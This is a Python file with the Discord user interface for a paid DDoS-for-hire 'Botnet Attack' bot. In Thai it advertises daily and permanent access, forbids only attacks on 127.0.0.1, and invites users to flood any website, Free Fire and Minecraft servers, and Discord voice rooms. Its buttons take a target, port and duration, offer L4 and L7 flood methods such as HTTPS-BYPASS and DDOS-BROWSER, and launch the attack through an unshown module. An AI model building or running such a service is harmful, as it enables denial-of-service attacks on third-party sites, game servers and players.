# ui_legacy.py
import discord
from config import (
    EMOJI_CONTACT, EMOJI_ALLOWED, L7_EMOJI, L4_EMOJI, CUSTOM_EMOJI,
    L7_METHODS, L4_METHODS,
)


def build_panel() -> dict:
    em = discord.Embed(
        title="Botnet Attack",
        color=discord.Color.pink(),
        description=(
            f"{EMOJI_CONTACT} **สนใจติดต่อ Tk มาเลยค้าบ วันละ 40 / ถาวร 300 TH**\n\n"
            "**กฎการใช้**\n"
            "ห้ามยิง Local IP `127.0.0.1` อย่างเดียวพออ\n\n"
            f"{EMOJI_ALLOWED} **Ddos ได้**\n"
            "เว็บอะไรก็ได้นอกจากเว็บต้องห้าม\n\n"
            "เซิร์ฟ ฟีฟาย\n"
            "เซิร์ฟ มายคราฟ\n"
            "ห้องเสียงDiscord"
        ),
    )
    view = discord.ui.View(timeout=None)
    view.add_item(PanelButton())
    return {"embed": em, "view": view}


class PanelButton(discord.ui.Button):
    def __init__(self):
        super().__init__(label="ขอ Device",
                         style=discord.ButtonStyle.secondary,
                         custom_id="panel_req")

    async def callback(self, interaction):
        from bot import open_attack_modal
        await open_attack_modal(interaction)


class AttackModal(discord.ui.Modal, title="Botnet Attack"):
    target = discord.ui.TextInput(label="Target IP / URL",
                                  placeholder="example.com",
                                  required=True, max_length=200)
    port = discord.ui.TextInput(label="Port", placeholder="65535",
                                required=True, max_length=5)
    duration = discord.ui.TextInput(label="Time (max 350s)",
                                    placeholder="300",
                                    required=True, max_length=3)

    async def on_submit(self, interaction):
        from bot import handle_attack_submit
        await handle_attack_submit(interaction, self)


def build_category_view(uid, target, port, dur) -> dict:
    em = discord.Embed(
        title="เลือกหมวดการยิง",
        color=discord.Color.blurple(),
        description=f"```\nTarget : {target}\nPort   : {port}\nTime   : {dur}s\n```",
    )
    view = discord.ui.View(timeout=300)
    view.add_item(CatButton("L7 (เว็บ)", "l7", uid, target, port, dur,
                            discord.ButtonStyle.primary))
    view.add_item(CatButton("L4 (เกม)", "l4", uid, target, port, dur,
                            discord.ButtonStyle.danger))
    view.add_item(CatButton("Custom L7", "custom_l7", uid, target, port, dur,
                            discord.ButtonStyle.secondary))
    view.add_item(CatButton("VC Discord", "vc", uid, target, port, dur,
                            discord.ButtonStyle.success))
    view.add_item(CatButton("Free Fire", "ff", uid, target, port, dur,
                            discord.ButtonStyle.success))
    return {"embed": em, "view": view}


class CatButton(discord.ui.Button):
    def __init__(self, label, key, uid, target, port, dur, style):
        super().__init__(label=label, style=style, custom_id=f"cat_{key}")
        self.key = key
        self.uid = uid
        self.target = target
        self.port = port
        self.dur = dur

    async def callback(self, interaction):
        if interaction.user.id != self.uid:
            await interaction.response.send_message(
                "ไม่ใช่คำสั่งของมึง", ephemeral=True)
            return
        from bot import show_method_panel
        await show_method_panel(interaction, self.key,
                                self.target, self.port, self.dur)


def build_method_view(cat, uid, target, port, dur) -> dict:
    if cat == "l7":
        title = "L7 Methods"
        methods, style = L7_METHODS, discord.ButtonStyle.primary
    elif cat == "l4":
        title = "L4 Methods"
        methods, style = L4_METHODS, discord.ButtonStyle.danger
    elif cat == "custom_l7":
        title = "Custom L7 Methods"
        methods = ["HTTPS-BYPASS", "HTTPS", "DDOS-BROWSER", "TLS"]
        style = discord.ButtonStyle.secondary
    elif cat == "vc":
        title = "VC Discord Flood"
        methods, style = ["VC-DISCORD"], discord.ButtonStyle.success
    else:
        title = "Free Fire Flood"
        methods, style = ["FREEFIRE"], discord.ButtonStyle.success

    em = discord.Embed(
        title=title,
        color=discord.Color.blurple(),
        description=f"```\nTarget : {target}\nPort   : {port}\nTime   : {dur}s\n```",
    )
    view = discord.ui.View(timeout=300)
    for m in methods:
        view.add_item(MethodButton(m, uid, target, port, dur, style))
    return {"embed": em, "view": view}


class MethodButton(discord.ui.Button):
    def __init__(self, method, uid, target, port, dur, style):
        super().__init__(label=method, style=style, custom_id=f"m_{method}")
        self.method = method
        self.uid = uid
        self.target = target
        self.port = port
        self.dur = dur

    async def callback(self, interaction):
        if interaction.user.id != self.uid:
            await interaction.response.send_message(
                "ไม่ใช่คำสั่งของมึง", ephemeral=True)
            return
        from bot import fire_attack
        await fire_attack(interaction, self.method, self.target,
                          self.port, self.dur)


def build_running(method, target, port, left, total, speed, hits=0) -> dict:
    em = discord.Embed(
        title="Attack Launched Successfully",
        color=discord.Color.dark_grey(),
        description=(
            f"```\n"
            f"[+] Method   : {method}\n"
            f"[+] Target   : {target}\n"
            f"[+] Port     : {port}\n"
            f"[+] Time     : {left}s / {total}s\n"
            f"[+] Speed    : {speed}\n"
            f"[+] Hits     : {hits}\n"
            f"[+] Cooldown : {'Running' if left > 0 else 'Ready'}\n"
            f"[+] Slot     : 0/1\n"
            f"```"
        ),
    )
    return {"embed": em}